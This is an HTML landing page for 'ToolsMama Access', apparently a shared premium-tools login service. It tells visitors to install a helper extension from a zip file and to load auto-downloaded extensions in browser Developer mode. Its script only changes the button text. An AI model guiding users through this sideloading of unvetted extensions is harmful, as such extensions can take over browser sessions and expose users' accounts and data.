<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ToolsMama Access</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 30px;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.2);
      max-width: 400px;
      width: 100%;
    }
    h1 {
      font-size: 24px;
      color: #333;
      margin-bottom: 15px;
    }
    p {
      font-size: 16px;
      color: #555;
      margin-bottom: 20px;
    }
    .access-btn {
      display: inline-block;
      padding: 12px 24px;
      background: #007bff;
      color: white;
      text-decoration: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      transition: background 0.3s;
      cursor: pointer;
    }
    .access-btn:hover {
      background: #0056b3;
    }
    .access-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .instructions {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
    .instructions a {
      color: #007bff;
      text-decoration: none;
    }
    .instructions a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>ToolsMama Access</h1>
    <p>Access premium tools with one click.</p>
    <a id="access-btn" href="https://app.toolsmama.com/login" target="_blank" class="access-btn">Access ToolsMama</a>
    <div class="instructions">
      <p><strong>Step 1:</strong> Install the <a href="c.zip">ToolsMama Helper extension</a>.</p>
      <p><strong>Step 2:</strong> Click "Access ToolsMama" to auto-login.</p>
      <p><strong>Step 3:</strong> Install auto-downloaded extensions in Developer mode.</p>
    </div>
  </div>
  <script>
    const btn = document.getElementById("access-btn");
    btn.addEventListener("click", () => {
      btn.textContent = "Logging in...";
      btn.disabled = true;
      setTimeout(() => {
        btn.textContent = "Access ToolsMama";
        btn.disabled = false;
      }, 5000);
    });
  </script>
</body>
</html>
